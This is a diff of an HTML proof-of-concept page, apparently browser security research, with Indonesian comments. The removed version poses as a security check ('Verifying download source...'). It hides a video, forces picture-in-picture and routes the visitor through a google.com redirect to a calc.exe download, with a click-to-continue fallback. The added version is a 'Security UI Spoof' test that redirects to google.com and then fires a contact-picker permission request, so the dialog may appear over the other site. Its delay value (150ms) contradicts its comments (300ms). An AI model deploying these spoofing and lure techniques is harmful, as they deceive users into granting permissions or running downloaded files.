@@ -1,44 +1,52 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Checking Security Protocol...</title>
-    <style>
-        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #fff; }
-        video { width: 1px; height: 1px; opacity: 0; }
-    </style>
-</head>
-<body>
-    <div style="text-align: center;">
-        <p>Verifying download source...</p>
-    </div>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof - Permission Race Test</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                font-family: sans-serif;
+            }         
+        </style>
+        <script>
+            onclick = async () => {
+                // 1. Segera lakukan redirect ke google.com
+                window.location.href = "https://www.google.com";
 
-    <video id="v" loop muted playsinline>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
+                // 2. Berikan timeout 300ms pada API select kontak
+                // Tujuannya melihat apakah dialog muncul saat halaman google.com mulai dimuat
+                setTimeout(async () => {
+                    try {
+                        await navigator.contacts.select(["name"], {});
+                    } catch (e) {
+                        console.log("Contact picker diblokir atau gagal karena navigasi");
+                    }
+                }, 150);
 
-    <script>
-        const v = document.getElementById('v');
-
-        window.onload = async () => {
-            try {
-                // Mencoba memicu PiP segera saat halaman dimuat
-                await v.play();
-                await v.requestPictureInPicture();
-                
-                // Setelah PiP aktif, arahkan ke download dengan redirector
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
-                }, 500);
-            } catch (e) {
-                // Jika butuh klik tambahan karena gesture expired
-                document.body.innerHTML = "<h1>Click anywhere to continue</h1>";
-                document.body.onclick = async () => {
-                    await v.play();
-                    await v.requestPictureInPicture();
-                    window.location.href = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
-                };
+                // 3. Tetap mencoba masuk Fullscreen untuk melihat persistensi transisi
+                try {
+                    if (document.documentElement.requestFullscreen) {
+                        await document.documentElement.requestFullscreen();
+                    }
+                } catch (e) {
+                    console.log("Fullscreen request failed");
+                }
             }
-        };
-    </script>
-</body>
+        </script>
+    </head>  
+    <body>
+        <div id="content">
+            <center>
+                <h1>Click to Test Permission over Redirect</h1>
+                <p>Redirect starts immediately, Contact API delayed by 300ms.</p>
+            </center>
+        </div>
+    </body>
 </html>
